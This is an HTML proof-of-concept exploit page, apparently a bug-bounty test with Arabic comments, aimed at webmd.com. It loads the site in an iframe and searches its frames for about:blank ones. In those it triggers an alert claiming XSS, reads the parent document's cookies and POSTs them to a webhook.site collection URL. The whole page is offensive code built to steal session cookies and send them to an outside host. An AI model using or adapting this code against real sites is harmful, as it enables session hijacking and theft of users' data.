<!DOCTYPE html>
<html>
<head>
    <title>PoC</title>
</head>
<body>
    <h3>iFrame Exploit Test</h3>
    <button onclick="exploitInline()">▶️ Exploit</button>
    <br><br>
    <iframe id="target" src="about:blank" width="800" height="600"></iframe>
    
    <script>
        const WEBHOOK = 'https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f';
        const TARGET = 'https://www.webmd.com';
        
        function exploitInline() {
            // تحميل الموقع في iframe
            document.getElementById('target').src = TARGET;
            
            setTimeout(() => {
                try {
                    let win = document.getElementById('target').contentWindow;
                    
                    for(let i = 0; i < win.frames.length; i++) {
                        let frame = win.frames[i];
                        
                        // التحقق من about:blank
                        if(frame.location.href === 'about:blank') {
                            
                            // 🚨 1. Alert - إثبات XSS
                            frame.alert('XSS CONFIRMED! Frame #' + i);
                            
                            // 🚨 2. سرقة Cookies
                            let cookies = frame.parent.document.cookie;
                            
                            // إرسال للـ Webhook
                            fetch(WEBHOOK, {
                                method: 'POST',
                                body: JSON.stringify({
                                    frame: i,
                                    cookies: cookies,
                                    time: new Date().toISOString()
                                })
                            });
                            
                            console.log('✅ Frame', i, 'pwned!');
                        }
                    }
                } catch(e) {
                    console.error('Error:', e);
                }
            }, 5000);
        }
    </script>
</body>
</html>
